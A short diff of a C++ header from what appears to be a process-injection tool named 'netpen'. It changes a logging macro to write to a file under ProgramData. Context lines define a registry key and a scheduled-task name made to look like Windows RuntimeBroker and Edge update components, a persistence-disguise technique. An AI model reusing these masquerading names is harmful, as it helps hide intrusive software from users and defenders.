@@ -6,7 +6,10 @@
 #include <cstdio>
 #include "config.h"
 
-#define RLOG(fmt, ...) do { char _b[512]; sprintf(_b, "RInj: " fmt, ##__VA_ARGS__); OutputDebugStringA(_b); } while(0)
+#define RLOG(fmt, ...) do { \
+    FILE* _f = _wfopen(L"C:\\ProgramData\\netpen_inj.log", L"a"); \
+    if (_f) { fprintf(_f, "RInj: " fmt "\n", ##__VA_ARGS__); fclose(_f); } \
+} while(0)
 
 #define NETPEN_REGKEY L"Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
 #define NETPEN_TASKNAME L"MicrosoftEdgeUpdateTaskCore"
